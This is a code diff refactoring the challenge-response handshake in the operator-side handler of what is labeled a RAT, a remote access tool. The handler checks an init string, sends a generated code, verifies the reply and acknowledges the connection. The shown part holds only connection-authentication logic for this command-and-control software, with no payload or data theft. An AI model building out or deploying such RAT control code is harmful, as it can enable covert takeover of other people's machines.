@@ -136,51 +136,46 @@ bool Handler::Challenge() {
 
     std::cout << "[*] Initiating Challenge. . ." << std::endl;
 
-    char buffer[1024] = {0};
-    int bytesReceived = recv(rat_conn, buffer, sizeof(buffer), 0);
+    std::pair<RatPacket,bool> recvPacket = RatPacketUtils::Recv(rat_conn);
 
-    if (bytesReceived > 0) {
+    if (recvPacket.second) {
         std::cout << "[*] Recv Init Packet. . ." << std::endl;
 
-        RatPacket initPacket(std::string(buffer, bytesReceived).c_str());
-        std::string msg = initPacket.GetPacketMessage();
+        std::string msg = recvPacket.first.GetPacketMessage();
 
         if (msg == "imgettingratty" &&
-            initPacket.GetType() == MsgType::INIT &&
-            initPacket.Length() == msg.size()) {
+            recvPacket.first.GetType() == MsgType::INIT &&
+            recvPacket.first.Length() == msg.size()) {
             std::cout << "[*] Sending Challenge. . ." << std::endl;
             // send challenge
             std::string code = GenerateChallenge();
-            RatPacket challPacket(code, MsgType::INIT);
-            send(rat_conn, challPacket.Frame().c_str(), challPacket.SizeOf(), 0);
+
+            RatPacketUtils::Send(rat_conn, RatPacket(code, MsgType::INIT));
 
             // recv challenge reply
             std::cout << "[*] Viewing Challenge Reply. . ." << std::endl;
-            char buffer[1024] = {0};
-            bytesReceived = recv(rat_conn, buffer, sizeof(buffer), 0);
-
-            if (bytesReceived > 0) {
-                std::cerr << "[*] Reply Code: " << std::string(buffer, bytesReceived) << std::endl;
-                std::string replyCode = RatPacket(std::string(buffer, bytesReceived).c_str()).GetPacketMessage();
+            recvPacket = RatPacketUtils::Recv(rat_conn);
+            if (recvPacket.second) {
+                std::string replyCode = recvPacket.first.GetPacketMessage();
+                std::cerr << "[*] Reply Code: " << replyCode << std::endl;
 
                 if (replyCode == code) {
                     // notify rat were established
                     std::cout << "[+] Established RAT Connection!" << std::endl;
-                    RatPacket ackPacket("ratty", MsgType::INIT);
-                    send(rat_conn, ackPacket.Frame().c_str(), ackPacket.SizeOf(), 0);
+                    RatPacketUtils::Send(rat_conn, RatPacket("ratty", MsgType::INIT));
                     return true;
                 }
 
                 std::cerr << "[-] Invalid Reply Code! (" << replyCode << ")" << "\n";
                 return false;
             }
-            std::cerr << "[-] Recv no Data! (" << bytesReceived << ")" << "\n";
+            std::cerr << "[-] Recv no Data!" << "\n";
             return false;
         }
         std::cerr << "[-] Invalid Message!" << "\n";
         return false;
     }
-    std::cerr << "[-] Recv no Data! (" << bytesReceived << ")" << "\n";
+    std::cerr << "[-] Recv no Data!" << "\n";
     return false;
 }
 
